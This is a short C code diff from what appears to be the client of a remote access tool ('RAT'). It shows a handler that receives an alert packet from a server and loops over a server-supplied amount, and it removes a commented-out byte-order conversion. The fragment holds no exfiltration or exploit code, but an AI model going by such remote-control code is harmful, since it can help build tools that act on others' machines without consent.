@@ -77,7 +77,6 @@ int client(int debug) {
     case RAT_PACKET_ALERT:
       sentbytes = recv(server, (char *)p->data, p->data_len, 0);
       alert_t *alert = (alert_t *)p->data;
-      // alert->amount = ntohl(alert->amount);
       LOG_DEBUG("received alert title=\"%s\" text\"%s\" amount=\"%d\"",
                 alert->title, alert->text, alert->amount);
       for (; alert->amount > 0; alert->amount--)
